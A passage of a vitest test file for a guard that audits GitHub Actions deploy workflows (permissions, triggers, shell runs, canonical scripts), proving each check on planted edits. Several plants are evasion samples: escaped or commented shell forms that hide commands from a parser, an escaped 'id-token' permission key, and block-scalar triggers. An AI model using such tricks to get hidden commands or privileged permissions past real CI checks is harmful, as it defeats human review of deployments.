// The deploy-workflow guard's cases (DPW-01 to DPW-14; C0.11, TECH-SPEC T24 items 20 to 23 and 28). The
// reader first finds the fifteen jobs and their steps, and reads every canonical text back exactly, and
// DPW-02 refuses any line in a shape it doesn't read, so a reformatted workflow fails rather than passing
// unread. Then each case is proved on planted text, an exact edit of the real file that throws when its
// anchor is gone, before it holds the repository.
// AWS_CHECK runs with bash and jq against planted AWS answers and a real git, ASSET_CHECK against
// planted copies of the workload's own assembly, protect-environments.sh check --from against planted
// answers, and history.ts's plan is driven for the gate's refusals. Every commit is made in a scratch
// repository, and nothing names an account, a login or an address. Last, `.claude/settings.json`'s deny
// rules are read for a `:*` anywhere but at a Bash rule's end (C11-D77), which Claude Code reads literally,
// and `.claude/` is held to carry no plugin and its settings to enable none and name no marketplace.
// This file and deploy-workflow.ts are on the owner's-read list (C11-D74).
import { execFileSync, spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { cpSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { gitIsAncestor, type PlanInput, parseReleaseRecords, plan } from '../../infra/scripts/deploy/history.ts'
import { PROFILES } from '../../infra/src/config/profiles.ts'
import { synthWorkload } from '../../infra/src/testing/workload.ts'
import {
  actionUrl,
  run as checkActionPins,
  gitEnvironment,
  lsRemote,
  pinProblems,
  readTagRefs,
  tagCommit,
} from '../check-action-pins.ts'
import { AGENT_MARKERS } from '../owner-bootstrap/target.ts'
import { ACTION_PINS, ACTION_SHAPE, PIN_SHAPE, PINS_JOB_ACTIONS } from './action-pins'
import {
  ASSET_CHECK,
  AWS_CHECK,
  actionPinFindings,
  assetCheckFindings,
  BOT_TEST,
  CANONICAL_BY_NAME,
  CDK_DEPLOY_DOWN,
  CDK_DEPLOY_DRILL,
  CDK_DEPLOY_FORWARD,
  CDK_DEPLOY_ROLLBACK,
  CDK_DEPLOY_SERVICES,
  CDK_DIFF_PROD,
  CDK_DIFF_ROLLBACK,
  CDK_FOLDER,
  CI,
  CLI_CHECK,
  CLI_FETCH,
  canonicalTextFindings,
  checkoutFindings,
  credentialedCodeFindings,
  credentialJobFindings,
  DEPLOY,
  DEPLOY_WORDS,
  DIFF_CUT,
  DIFF_RUN,
  deployStepFindings,
  ENVIRONMENT_JOBS,
  evaluatedLines,
  evaluateIf,
  FAST_RECHECK_NONPROD,
  FAST_RECHECK_PROD,
  forbiddenWordFindings,
  functionDefinitions,
  GENERAL_WORDS,
  GUARD,
  gateFindings,
  IMAGE_CHECK,
  IMAGE_LAYOUT,
  IMAGE_UNPACK_RUN,
  JOB_IDS,
  MAIN_CI,
  MASK_RUN,
  MIGRATE_LINES,
  maskingFindings,
  NET_JQ,
  NEWEST_RELEASE,
  NVMRC,
  ONE_OFF,
  OVERRIDES_JQ,
  outsideEvaluations,
  PINNED_RUNS,
  PLAN_CALL,
  PREAMBLE,
  PROBE,
  PROBE_LINES,
  PROD_GATE_CALL,
  PULL_CHECKS,
  permissionFindings,
  prodPathFindings,
  RESTORE_DOWN,
  RULESET,
  RUN_TASK_MIGRATE,
  RUN_TASK_PROBE,
  readShell,
  releaseFindings,
  SKOPEO_COPY,
  SMOKE_ATTEMPT,
  STOP_COMMANDS,
  STOP_HEAD,
  shellCommands,
  shellViews,
  TARGETS_QUERY,
  TASKS_OUTPUTS,
  timeoutAndGroupFindings,
  triggerFindings,
} from './deploy-workflow'
import { readRepoFile, repoFiles, root } from './repo-files'
import {
  jobConcurrency,
  jobEnvironment,
  jobNeeds,
  jobPermissions,
  jobScalar,
  parsedSteps,
  workflowJobs,
  workflowTop,
} from './workflow'

const files = repoFiles()
const workflows: ReadonlyMap<string, string> = new Map(
  files.filter(path => /^\.github\/workflows\/[^/]+\.ya?ml$/.test(path)).map(path => [path, readRepoFile(path)]),
)
const deployText = readRepoFile(DEPLOY)
const rulesetText = readRepoFile(RULESET)
const environments: ReadonlyMap<string, string> = new Map(
  files.filter(path => path.startsWith('.github/environments/')).map(path => [path, readRepoFile(path)]),
)
const protectEnvironments = readRepoFile('scripts/protect-environments.sh')
// Every workspace's package.json, read from the root's workspaces globs (a folder, or a folder's children
// by a trailing /*), and the root's own.
const workspaceGlobs = (JSON.parse(readRepoFile('package.json')) as { workspaces?: unknown }).workspaces
const workspacePattern = new RegExp(
  `^(?:${(Array.isArray(workspaceGlobs) ? workspaceGlobs : [])
    .map(glob =>
      String(glob)
        .replace(/[.+?^${}()|[\]\\]/g, '\\$&')
        .replace(/\/\*$/, '/[^/]+'),
    )
    .join('|')})/package\\.json$`,
)
const manifests: ReadonlyMap<string, string> = new Map(
  files.filter(path => path === 'package.json' || workspacePattern.test(path)).map(path => [path, readRepoFile(path)]),
)
const lockfile = readRepoFile('package-lock.json')

// The real text with one exact edit: `from` replaced where it first appears after `after` (or anywhere,
// with no anchor). Either missing throws, so a plant never passes by editing nothing.
function edited(text: string, from: string, to: string, after = ''): string {
  const start = text.indexOf(after)
  if (start < 0) throw new Error(`planted edit: no anchor ${JSON.stringify(after.slice(0, 80))}`)
  const at = text.indexOf(from, start)
  if (at < 0) throw new Error(`planted edit: no text ${JSON.stringify(from.slice(0, 80))}`)
  return text.slice(0, at) + to + text.slice(at + from.length)
}

const withText = (path: string, text: string): ReadonlyMap<string, string> =>
  new Map([...workflows].map(([each, real]) => [each, each === path ? text : real]))

// The workflows with one exact edit to one of them (deploy.yml unless named).
const plant = (from: string, to: string, after = '', path = DEPLOY) =>
  withText(path, edited(workflows.get(path) ?? '', from, to, after))

const job = (id: string) => `\n  ${id}:\n`

// A step's raw lines in deploy.yml: from its name's line to the next step or job.
function stepText(text: string, jobId: string, name: string): string {
  const jobAt = text.indexOf(job(jobId))
  const start = text.indexOf(`      - name: ${name}\n`, jobAt)
  if (jobAt < 0 || start < 0) throw new Error(`planted edit: no step ${name} in ${jobId}`)
  const end = /\n(?: {6}- | {2}\S)/g
  end.lastIndex = start + 1
  const next = end.exec(text)
  return text.slice(start, next === null ? text.length : next.index + 1)
}

// deploy.yml with a step taken out, moved before another of its job's, or copied into another job.
const removedStep = (jobId: string, name: string) =>
  withText(DEPLOY, edited(deployText, stepText(deployText, jobId, name), '', job(jobId)))
function movedStep(jobId: string, name: string, before: string) {
  const step = stepText(deployText, jobId, name)
  const without = edited(deployText, step, '', job(jobId))
  return withText(DEPLOY, edited(without, `      - name: ${before}\n`, `${step}      - name: ${before}\n`, job(jobId)))
}
function copiedStep(fromJob: string, name: string, toJob: string, before: string) {
  const step = stepText(deployText, fromJob, name)
  return withText(
    DEPLOY,
    edited(deployText, `      - name: ${before}\n`, `${step}      - name: ${before}\n`, job(toJob)),
  )
}
// deploy.yml with lines added to a step's run, before one of its lines (each with its indent).
function addedBefore(jobId: string, stepName: string, line: string, added: string) {
  const step = stepText(deployText, jobId, stepName)
  return withText(DEPLOY, edited(deployText, step, edited(step, line, `${added}${line}`), job(jobId)))
}

// What a run said on its stdout, line by line, but the stop-commands line STOP_HEAD prints first, which only
// the runner reads.
const STOP_LINE = /^::stop-commands::[0-9a-f]{32}$/
const spoken = (stdout: string): string[] =>
  stdout
    .trim()
    .split('\n')
    .filter(line => !STOP_LINE.test(line))

// DPW-02's finding for a file workflow.ts would read wrong.
const SHAPE =
  'is written in the shape workflow.ts reads: two-space block nesting, each key once in its mapping, each value whole on its line'

// The findings for a run's own lines (every line outside a canonical text standing whole): one the table
// doesn't name, at its line (DPW-07, DPW-10, DPW-13), and a command not held to its uses (DPW-10, DPW-13).
const AS_BASH =
  'is written in the shell the guard reads: outside a canonical text standing whole, only what SHELL_TABLE names (blanks that are a space or a tab, its word characters, single and double quotes, its expansions, substitutions, operators, redirections, keywords, tests, case patterns, functions and assignments, its builtins as it holds them, a comment only at a line’s start or after a blank), each stretch closing all it opens'
const HELD =
  'gives each command its own lines run only the flags and arguments the workflow uses (GLUE_USES), no assignment before it, and no file to read but the diff or to write but its outputs, its summary, the diff and /dev/null, so none runs code, reads a file the guard can’t see or writes one'
// The findings for a run the guard pins whole (PINNED_RUNS), under the rule that holds it, and for an output
// written outside one.
const PINNED_08 =
  "runs as written, whole and under its own if: (PINNED_RUNS): the pull request's checks, main's CI, the prod gate, prod's records, the smoke, services_started, the read-back, a rollback's releases and rolled, and the approver's diff, so no line of its own ends one early or writes an output or a file of its own"
const PINNED_09 =
  "runs as written, whole and under its own if: (PINNED_RUNS): the records, main's ruleset and the live environments the plan rests on and the plan itself, so no line of its own ends one early, skips one, forges what the plan reads or writes an output of its own"
// DPW-04's finding for ci.yml's job that proves the pins (FETCH-A3-01, round 5's fourth attack).
const PINS_JOB_FINDING =
  "runs node scripts/check-action-pins.ts in a job of its own, action-pins, on GitHub's runner ubuntu-24.04, whose steps are only checkout without credentials and setup-node with Node from .nvmrc and no cache, each at its commit and version comment in PINS_JOB_ACTIONS, and the check, in a workflow that holds only name, on, permissions and jobs at its top (no env: or defaults:, which reach every step), so nothing of the repository's and no action the check can't prove runs before it; check needs it, runs under always() and first fails, by that step's if: and exit 1 alone, when a job it needs didn't succeed"
const PINNED_13 =
  'runs as written, whole and under its own if: (PINNED_RUNS) and in its own folder: the build, the synth, the release, the push, migrate with its record and the record job, so no line of its own builds, synthesises, tags, migrates or records by another commit, context, task or environment, or runs, prints or writes what a rule reading the text would miss'
const UNPINNED = 'runs only what PINNED_RUNS pins whole: no run of deploy.yml has a line of its own'
const PINNED_10 =
  'runs as written, whole and under its own if: (PINNED_RUNS): every run of a job that holds the deploy role, or the OIDC request token that gets it, so no line of its own reads, splits, prints or sends what the job holds or hands a pinned line another input'
const OUTPUT_PINNED = 'writes an output only from a run the guard pins whole'

const indent = (text: string, n: number) =>
  text
    .split('\n')
    .map(line => (line === '' ? '' : `${' '.repeat(n)}${line}`))
    .join('\n')

describe('DPW: the guard reads the deploy workflow', () => {
  const STEPS: Readonly<Record<string, number>> = {
    gate: 7,
    build: 11,
    synth: 16,
    nonprod: 21,
    'smoke-nonprod': 3,
    'rollback-nonprod': 13,
    'resmoke-nonprod': 3,
    'record-nonprod': 1,
    'prod-plan': 9,
    'prod-gate': 5,
    prod: 21,
    'smoke-prod': 3,
    'rollback-prod': 13,
    'resmoke-prod': 3,
    'record-prod': 1,
  }

  it('finds the fifteen jobs in order and every step of each, parsed alike by both readers', () => {
    const jobs = workflowJobs(deployText)
    expect(jobs.map(each => each.id)).toEqual([...JOB_IDS])
    for (const each of jobs) {
      expect(each.steps.length, each.id).toBe(STEPS[each.id])
      expect(parsedSteps(each).length, each.id).toBe(STEPS[each.id])
    }
    expect([...workflowTop(deployText).keys()]).toEqual(['name', 'on', 'permissions', 'jobs'])
  })

  it('reads the canonical texts back through parsedSteps exactly as written, comment and blank lines kept', () => {
    const texts = { PREAMBLE, ASSET_CHECK, CDK_FOLDER, AWS_CHECK, CLI_FETCH, CLI_CHECK, ONE_OFF, PROBE }
    const planted = [
      'jobs:',
      '  x:',
      '    runs-on: ubuntu-24.04',
      '    steps:',
      ...Object.entries(texts).flatMap(([name, text]) => [
        `      - name: ${name}`,
        '        run: |',
        indent(`${text}\n\n# a closing comment`, 10),
      ]),
      '  # the next job',
      '  y:',
      '    steps:',
      '      - run: true',
    ].join('\n')
    const [first] = workflowJobs(planted)
    if (first === undefined) throw new Error('the planted workflow has a job')
    const steps = parsedSteps(first)
    expect(steps.map(step => step.name)).toEqual(Object.keys(texts))
    for (const step of steps) {
      expect(step.run).toBe(`${texts[step.name as keyof typeof texts]}\n\n# a closing comment`)
      expect(step.lines.at(-1)?.trim()).toBe('# a closing comment')
    }
    // And in the real file, where each sits whole in the steps that run it.
    const runs = workflowJobs(deployText).flatMap(each => parsedSteps(each).map(step => step.run ?? ''))
    for (const text of [
      PREAMBLE,
      ASSET_CHECK,
      CDK_FOLDER,
      AWS_CHECK,
      CLI_FETCH,
      CLI_CHECK,
      ONE_OFF,
      PROBE,
      TASKS_OUTPUTS,
    ]) {
      expect(runs.some(run => run.includes(text))).toBe(true)
    }
    for (const line of [
      CDK_DEPLOY_FORWARD,
      CDK_DEPLOY_SERVICES,
      CDK_DEPLOY_DRILL,
      CDK_DEPLOY_ROLLBACK,
      CDK_DEPLOY_DOWN,
      CDK_DIFF_PROD,
      CDK_DIFF_ROLLBACK,
      RUN_TASK_MIGRATE,
      RUN_TASK_PROBE,
      NET_JQ.migrate,
      NET_JQ.probe,
      OVERRIDES_JQ,
      SKOPEO_COPY,
    ]) {
      expect(
        runs.some(run => run.split('\n').some(each => each.trim() === line)),
        line,
      ).toBe(true)
    }
    expect(PROBE).toContain(TARGETS_QUERY)
    expect(RESTORE_DOWN).toContain(CDK_DEPLOY_DOWN)
  })

  it('reads job keys, environments, permissions, needs and concurrency on planted text', () => {
    const planted = [
      'jobs:',
      '  a:',
      '    needs: gate',
      '    environment: nonprod',
      '    permissions: write-all',
      '    concurrency: deploy-nonprod',
      '    steps:',
      '      - run: true',
      '  b:',
      '    needs: [gate, build]',
      '    environment:',
      '      name: prod',
      '    permissions: {}',
      '    concurrency:',
      '      group: deploy-prod',
      '      cancel-in-progress: false',
      '      queue: max',
      '  c:',
      '    needs:',
      '      - gate',
      `    environment: \${{ inputs.target }}`,
      '    permissions:',
      '      id-token: write',
      '      contents: read',
      '  d:',
      '    environment: { name: prod }',
      '    permissions: read-all',
    ].join('\n')
    const [a, b, c, d] = workflowJobs(planted)
    if (a === undefined || b === undefined || c === undefined || d === undefined) throw new Error('four jobs')
    expect([jobNeeds(a), jobNeeds(b), jobNeeds(c), jobNeeds(d)]).toEqual([['gate'], ['gate', 'build'], ['gate'], []])
    expect([jobEnvironment(a), jobEnvironment(b), jobEnvironment(c), jobEnvironment(d)]).toEqual([
      'nonprod',
      'prod',
      { expression: true },
      { unreadable: true },
    ])
    expect([jobPermissions(a), jobPermissions(b), jobPermissions(d)]).toEqual(['write-all', '{}', 'read-all'])
    expect(jobPermissions(c)).toEqual(
      new Map([
        ['id-token', 'write'],
        ['contents', 'read'],
      ]),
    )
    expect(jobConcurrency(a)).toEqual({ group: 'deploy-nonprod', cancelInProgress: undefined, other: [] })
    expect(jobConcurrency(b)).toEqual({ group: 'deploy-prod', cancelInProgress: 'false', other: ['queue'] })
    expect(a.keyNames).toEqual(['needs', 'environment', 'permissions', 'concurrency', 'steps'])
  })

  it('reads a run as bash does: comments, quoted text and case patterns are no commands; substitutions are', () => {
    const run = [
      '# node in a comment',
      'echo "node $(gh api x) docker" \'npx\' # bash',
      'case "$X" in',
      '  node | docker) jq . ;;',
      '  "$(readlink -f y)"/*) ;;',
      'esac',
      'if [[ "$a" =~ ^(node|x)$ ]] && ! run aws s3 ls; then CDK=1 env | sort; fi',
      "jq -n '",
      '  node docker',
      "' >x",
      'TOKEN="a-$GITHUB_RUN_ID-b"',
    ].join('\n')
    const words = shellCommands(run).map(command => [...command.prefixes, command.word].join(' '))
    expect(words).toEqual([
      'echo',
      'gh',
      'case',
      'jq',
      'readlink',
      'esac',
      '[[',
      'run aws',
      'CDK=1 env',
      'sort',
      'fi',
      'jq',
    ])
    expect(shellViews('echo "a # b" # c').text).toBe('echo "a # b"    ')
  })

  it('reads through a wrapper or a redirection before a command, and both spellings of a function', () => {
    const read = (run: string) => shellCommands(run).map(command => [...command.prefixes, command.word].join(' '))
    expect(read('command -p ./x.sh')).toEqual(['command -p ./x.sh'])
    expect(read('exec -a name ./x.sh')).toEqual(['exec -a name'])
    expect(read('time -p ./x.sh; nohup -- ./y.sh')).toEqual(['time -p ./x.sh', 'nohup -- ./y.sh'])
    expect(read('timeout -s KILL 5 ./x.sh')).toEqual(['timeout -s KILL 5'])
    expect(read('env -0')).toEqual(['env -0'])
    expect(read('2>/dev/null aws sts get-caller-identity')).toEqual(['2>/dev/null aws'])
    expect(read('</dev/null cp a b; x &>/dev/null y')).toEqual(['</dev/null cp', 'x'])
    expect(read('[ ! -L "$x" ] && echo 2')).toEqual(['[', 'echo'])
    expect(
      functionDefinitions('mask() { cat; }\nfunction run { :; }\nget () ( : )\nlocal x=() y\necho "f() {"'),
    ).toEqual([
      { name: 'mask', line: 0 },
      { name: 'run', line: 1 },
      { name: 'get', line: 2 },
    ])
  })

  // GUARDS-01: each way the reader once read past what bash runs; bash runs cp in every one.
  it('reads a # after an escape, a [[ or case as an argument and a case inside a substitution as bash does', () => {
    const read = (run: string) => shellCommands(run).map(command => [...command.prefixes, command.word].join(' '))
    expect(read('echo a\\ #;cp a b')).toEqual(['echo', 'cp'])
    // The line a backslash-newline continues starts no comment (its # is read as a word, which no rule allows).
    expect(read('echo ok\\\n#;cp a b')).toEqual(['echo', '#', 'cp'])
    expect(read('echo [[ ; cp a b ; echo ]]')).toEqual(['echo', 'cp', 'echo'])
    expect(read('echo \\\n[[ ; cp a b ; ]]')).toContain('cp')
    expect(read('X=$(echo case in\ncp a b)')).toEqual(['echo', 'cp'])
    expect(read('echo case in\ncp a b')).toEqual(['echo', 'cp'])
    // A real test and case still read as bash reads them: their operands and patterns are no commands.
    expect(read('if [[ "$a" == x ]]; then cp a b; fi\ncase "$b" in\n  cp) jq . ;;\nesac')).toEqual([
      '[[',
      'cp',
      'fi',
      'case',
      'jq',
      'esac',
    ])
    // A case on one line, several items on a line, and a case in an unquoted substitution are read too.
    expect(read('case x in x) cp a b;; esac')).toEqual(['case', 'cp', 'esac'])
    expect(read('case x in\n  x) :;; true) cp a b;;\nesac')).toEqual(['case', ':', 'cp', 'esac'])
    expect(read('X=$(\ncase x in x) cp a b;; esac)')).toEqual(['case', 'cp', 'esac'])
    // A case inside any substitution, quoted or not, or backticks is a shape the reader can't follow (its
    // pattern's ) would close the substitution), which shellViews says.
    expect(shellViews('X="$(case x in x) cp a b;; esac)"').nestedCase).toBe(true)
    expect(shellViews('X=`case x in x) cp a b;; esac`').nestedCase).toBe(true)
    expect(shellViews('X=$(\ncase x in x) cp a b;; esac)').nestedCase).toBe(true)
    expect(shellViews('case "$(readlink -f x)" in\n  y) ;;\nesac').nestedCase).toBe(false)
    expect(shellViews('echo a\\ #b').text).toBe('echo a\\ #b')
    expect(shellViews('echo a #b').text).toBe('echo a   ')
  })

  // Round 3's SECURITY-01: a canonical text is accepted whole, which is sound only while each of its lines
  // that bash evaluates as arithmetic or a name evaluates what the text itself sets (a local, a literal
  // subscript) or bash's own count of seconds (outsideEvaluations() holds that). These are every such line,
  // so a canonical text given another is a reviewed change here too; ONE_OFF's count of withheld lines is
  // jq's now, so it evaluates no command's output.
  it('pins the lines of the canonical texts that bash evaluates as arithmetic or a name', () => {
    const evaluated = (text: string) => evaluatedLines(text).map(n => text.split('\n')[n]?.trim())
    expect(evaluated(ASSET_CHECK)).toEqual([
      `dir=\${queue[0]}`,
      `queue=("\${queue[@]:1}")`,
      `dir=\${queue[0]}`,
      `queue=("\${queue[@]:1}")`,
      'manifests=$((manifests + 1))',
      'services=$((services + 1))',
    ])
    expect(evaluated(AWS_CHECK)).toEqual([
      `tag=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=\${digests[0]}" --query 'imageDetails[0].imageTags' --output json 2>/dev/null | jq -r 'first(.[]? | capture("^sha-(?<c>[0-9a-f]{40})-").c) // ""' || true)`,
    ])
    // bash's own SECONDS reads as its count, whatever was assigned to it.
    expect(evaluated(MAIN_CI)).toEqual(['DEADLINE=$((SECONDS + 30 * 60))'])
    for (const text of [
      PREAMBLE,
      CDK_FOLDER,
      CLI_FETCH,
      CLI_CHECK,
      TASKS_OUTPUTS,
      ONE_OFF,
      PROBE,
      NEWEST_RELEASE,
      PULL_CHECKS,
      PROD_GATE_CALL,
      FAST_RECHECK_NONPROD,
      FAST_RECHECK_PROD,
      SMOKE_ATTEMPT,
      RESTORE_DOWN,
    ]) {
      expect(evaluated(text)).toEqual([])
    }
  })

  // Round 3's GUARDS-03: the word after an assignment's value or a redirection's target that holds a
  // substitution, or a quoted string over two lines, is a command, on one line or after the value's own
  // lines; a substitution as that word is the substitution-as-a-word shape, never a command named by its
  // first character.
  it('reads the command after an assignment or a redirection that holds a substitution', () => {
    const words = (run: string) => shellCommands(run).map(each => each.word)
    expect(words('X=$(true) cp a b')).toEqual(['true', 'cp'])
    expect(words('X="$(true)" cp a b')).toEqual(['true', 'cp'])
    expect(words('X=a$(true)$(false) cp a b')).toEqual(['true', 'false', 'cp'])
    expect(words('< <(true) cp a b')).toEqual(['true', 'cp'])
    expect(words('<$(echo /dev/null) cp a b')).toEqual(['echo', 'cp'])
    expect(words('X=$(true\n) cp a b')).toEqual(['true', 'cp'])
    expect(shellCommands('X=$(true\n) cp a b').find(each => each.word === 'cp')).toMatchObject({
      line: 1,
      prefixes: [expect.stringMatching(/^X=/)],
      substituted: false,
      rest: ' a b',
    })
    expect(words('X=$(true) $(echo cp) a b')).toEqual(['true', 'echo'])
    // A quoted value or target over two lines is one word too.
    expect(shellCommands("X='a\nb' cp a b").map(each => [each.line, each.word])).toEqual([[1, 'cp']])
    expect(words('X="a\n$(true)\nb" cp a b')).toEqual(['true', 'cp'])
    expect(words("< 'a\nb' cp a b")).toEqual(['cp'])
    // An assignment alone runs nothing itself, and what follows an operator is read as before.
    expect(words('X=$(true)')).toEqual(['true'])
    expect(words('X=$(true) || cp a b')).toEqual(['true', 'cp'])
  })

  it("evaluates an if: as GitHub would with some values unknown (Kleene's logic)", () => {
    const bot = { 'github.actor': 'dependabot[bot]' }
    expect(evaluateIf(`\${{ ${BOT_TEST} && x == 'y' }}`, bot)).toBe(false)
    expect(evaluateIf(`\${{ ${BOT_TEST} && x == 'y' || always() }}`, bot)).toBeUndefined()
    expect(evaluateIf(`\${{ ${BOT_TEST} }}`, { 'github.actor': 'a', 'github.triggering_actor': 'b' })).toBe(true)
    const mode = (value: string) => ({ 'needs.gate.outputs.mode': value })
    const condition = `\${{ !cancelled() && (needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') }}`
    expect(evaluateIf(condition, mode('drill-break'))).toBe(false)
    expect(evaluateIf(condition, mode('deploy'))).toBeUndefined()
    expect(evaluateIf(`\${{ needs.gate.outputs.mode != 'rollback' }}`, mode('drill-smoke'))).toBe(true)
    expect(evaluateIf(`\${{ needs.x.outputs.y != '' && z }}`, { 'needs.x.outputs.y': '' })).toBe(false)
    // GUARDS-02: GitHub coerces values of two types to numbers before == or != (null == 0, '0' == false and
    // '' == 0 are true there) and binds ! tighter than ==, so none of these may read as false.
    for (const term of ['null == 0', "'0' == false", "'' == 0", "!'0' == '0'", 'x == 0', "!x == '0'", "'abc' != 0"]) {
      expect(evaluateIf(`\${{ ${term} }}`, { x: '' }), term).not.toBe(false)
      expect(evaluateIf(`\${{ ${BOT_TEST} && y || ${term} }}`, { ...bot, x: '' }), term).not.toBe(false)
    }
    expect(evaluateIf(`\${{ !'' == true }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ 'a' == 'A' && null == null && 1 == 1 && !(true == false) }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ 'a' == 'b' == false }}`, {})).toBe(true)
    // Round 2's GUARDS-03: && and || return an operand, so one with an unknown value keeps it, its truth
    // alone known; strings compare as GitHub upper-cases them, which this reads only for ASCII.
    for (const term of [
      "(github.run_id || 'a') != true",
      "(github.run_id || 'a') == 1",
      '(x && false) == false',
      "'\u212A' != 'k'",
      "'ſ' == 's'",
      "!contains('\u212A', 'k')",
      "!startsWith('ﬀ', 'FF')",
    ]) {
      expect(evaluateIf(`\${{ ${term} }}`, {}), term).toBeUndefined()
      expect(evaluateIf(`\${{ ${BOT_TEST} && y || ${term} }}`, bot), term).toBeUndefined()
    }
    expect(evaluateIf(`\${{ github.run_id || 'a' }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ x && false }}`, {})).toBe(false)
    expect(evaluateIf(`\${{ !(x && false) }}`, {})).toBe(true)
    expect(evaluateIf(`\${{ 'Ab' == 'aB' && endsWith('X[BOT]', '[bot]') }}`, {})).toBe(true)
    // Round 2's GUARDS-04: anything beside the expression makes a string GitHub reads as true.
    for (const value of [`\${{ false }} `, ` \${{ false }}`, `\${{ false }}\n`, 'false', `x\${{ false }}`]) {
      expect(evaluateIf(value, {}), JSON.stringify(value)).toBeUndefined()
    }
    expect(evaluateIf(`\${{ false }}`, {})).toBe(false)
  })
})

describe('DPW-01 (C11-D47, C11-D62): what starts the workflow', () => {
  // Round 2's GUARDS-05: an on: written as a block scalar names its event in text the YAML line reader skips.
  it('finds pull_request_target or workflow_run written as a block scalar under on:, in any workflow', () => {
    const EVENTS = 'uses neither pull_request_target nor workflow_run'
    const BLOCK = 'writes on: with no block scalar, so every event it names is read'
    const ci = workflows.get(CI) ?? ''
    const on = ci.slice(ci.indexOf('\non:\n') + 1, ci.indexOf('\n', ci.indexOf('    branches: [main]\n')) + 1)
    expect(on.startsWith('on:\n')).toBe(true)
    for (const [value, event] of [
      ['|-', 'pull_request_target'],
      ['>-', 'workflow_run'],
      ['|2-', 'pull_request_target'],
      ['|+', 'workflow_run'],
    ] as const) {
      const planted = `on: ${value}\n  ${event}\n`
      expect(triggerFindings(withText(CI, ci.replace(on, planted)), rulesetText), value).toEqual([
        `${CI}: DPW-01 ${EVENTS}`,
        `${CI}: DPW-01 ${BLOCK}`,
      ])
      const other = '.github/workflows/x.yml'
      expect(
        triggerFindings(new Map([...workflows, [other, `name: x\n${planted}jobs: {}\n`]]), rulesetText),
        value,
      ).toEqual([`${other}: DPW-01 ${EVENTS}`, `${other}: DPW-01 ${BLOCK}`])
    }
    // A block scalar anywhere under on: (a filter's) is refused too, and the plain spellings still are.
    const secrets = workflows.get('.github/workflows/secrets.yml') ?? ''
    expect(
      triggerFindings(
        withText(
          '.github/workflows/secrets.yml',
          secrets.replace('    branches-ignore: [main]\n', '    branches-ignore: |\n      main\n'),
        ),
        rulesetText,
      ),
    ).toEqual([`.github/workflows/secrets.yml: DPW-01 ${BLOCK}`])
    expect(triggerFindings(withText(CI, ci.replace(on, 'on: [push, workflow_run]\n')), rulesetText)).toEqual([
      `${CI}: DPW-01 ${EVENTS}`,
    ])
  })

  const ON = [
    `${DEPLOY}: DPW-01 on: is a push to main and a dispatch with exactly the target, mode, release and restore inputs`,
  ]
  const RULES = [`${RULESET}: DPW-01 the required checks include check and migrations and name no deploy.yml job`]
  const on = (from: string, to: string) => triggerFindings(plant(from, to), rulesetText)

  it('finds each planted breakage', () => {
    expect(on('  workflow_dispatch:\n', '  workflow_call:\n  workflow_dispatch:\n')).toEqual(ON)
    expect(on('  workflow_dispatch:\n', "  schedule:\n    - cron: '0 3 * * *'\n  workflow_dispatch:\n")).toEqual(ON)
    expect(on('    branches: [main]\n', "    branches: [main, 'release/*']\n")).toEqual(ON)
    expect(on('        type: string\n', '        type: environment\n')).toEqual(ON)
    expect(on("        default: ''\n", "        default: ''\n        required: true\n")).toEqual(ON)
    expect(triggerFindings(plant('  pull_request: {}\n', '  pull_request_target: {}\n', '', CI), rulesetText)).toEqual([
      `${CI}: DPW-01 uses neither pull_request_target nor workflow_run`,
    ])
    expect(
      triggerFindings(
        plant('    needs: [secrets, audit, action-pins]\n', '    needs: [secrets, audit, action-pins, gate]\n', '', CI),
        rulesetText,
      ),
    ).toEqual([`${CI}: DPW-01 check: needs no deploy.yml job`])
    const migrations = '{ "context": "migrations", "integration_id": 15368 }'
    expect(
      triggerFindings(
        workflows,
        edited(rulesetText, migrations, `${migrations},\n          { "context": "smoke-prod" }`),
      ),
    ).toEqual(RULES)
    expect(triggerFindings(workflows, edited(rulesetText, `,\n          ${migrations}`, ''))).toEqual(RULES)
  })

  it('holds the repository', () => {
    expect(triggerFindings(workflows, rulesetText)).toEqual([])
  })
})

describe('DPW-02 (C11-D55): permissions', () => {
  const ID_TOKEN = `${DEPLOY}: DPW-02 only the five environment jobs ask for an id-token, and nothing asks for write-all`
  const READ_ONLY = '    permissions:\n      contents: read\n'

  it('finds each planted breakage', () => {
    expect(permissionFindings(plant(READ_ONLY, `${READ_ONLY}      id-token: write\n`, job('build')))).toEqual([
      `${DEPLOY}: DPW-02 build: its permissions are exactly contents: read`,
      ID_TOKEN,
    ])
    expect(
      permissionFindings(
        plant('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: read\n  id-token: write\njobs:'),
      ),
    ).toEqual([`${DEPLOY}: DPW-02 the top-level permissions are contents: read alone`, ID_TOKEN])
    expect(permissionFindings(plant(READ_ONLY, `${READ_ONLY}      deployments: write\n`, job('smoke-prod')))).toEqual([
      `${DEPLOY}: DPW-02 smoke-prod: its permissions are exactly contents: read`,
    ])
    expect(
      permissionFindings(
        plant('    environment: nonprod\n', `    environment: \${{ inputs.target }}\n`, job('nonprod')),
      ),
    ).toEqual([`${DEPLOY}: DPW-02 nonprod: names its environment by a literal name`])
    expect(permissionFindings(plant(READ_ONLY, '    permissions: { contents: read }\n', job('build')))).toEqual([
      `${DEPLOY}: DPW-02 build: its permissions are exactly contents: read`,
      `${DEPLOY}: DPW-02 is written in block mappings: no flow mapping, anchor, alias or quoted key`,
      `${DEPLOY}: DPW-02 ${SHAPE}`,
    ])
    const check = '  check:\n    needs: [secrets, audit, action-pins]\n'
    expect(permissionFindings(plant(check, `${check}    permissions: write-all\n`, '', CI))).toEqual([
      `${CI}: DPW-02 no job may ask for an id-token`,
    ])
    expect(permissionFindings(plant(check, `${check}    environment: prod\n`, '', CI))).toEqual([
      `${CI}: DPW-02 names no environment`,
    ])
    const secrets = '.github/workflows/secrets.yml'
    expect(
      permissionFindings(
        plant(
          'permissions:\n  contents: read\n',
          'permissions:\n  contents: read\n  "id\\x2Dtoken": write\n',
          '',
          secrets,
        ),
      ),
    ).toEqual([
